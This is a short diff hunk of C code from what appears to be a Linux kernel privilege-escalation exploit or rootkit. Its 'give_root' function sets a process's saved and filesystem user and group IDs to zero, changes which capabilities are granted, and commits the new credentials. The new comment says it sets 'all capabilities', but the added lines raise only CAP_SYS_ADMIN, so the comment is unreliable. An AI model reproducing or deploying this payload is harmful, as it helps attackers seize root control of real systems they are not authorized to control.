@@ -24,11 +24,10 @@ static void give_root(void) {
     newcreds->suid.val = newcreds->sgid.val = 0;
     newcreds->fsuid.val = newcreds->fsgid.val = 0;
     
-    // Clear capability bounding set and add all capabilities
-    cap_clear(newcreds->cap_bset);
-    cap_set_full(newcreds->cap_effective);
-    cap_set_full(newcreds->cap_inheritable);
-    cap_set_full(newcreds->cap_permitted);
+    // Set all capabilities for kernel 6.x
+    cap_raise(newcreds->cap_effective, CAP_SYS_ADMIN);
+    cap_raise(newcreds->cap_inheritable, CAP_SYS_ADMIN);
+    cap_raise(newcreds->cap_permitted, CAP_SYS_ADMIN);
     
     commit_creds(newcreds);
 }
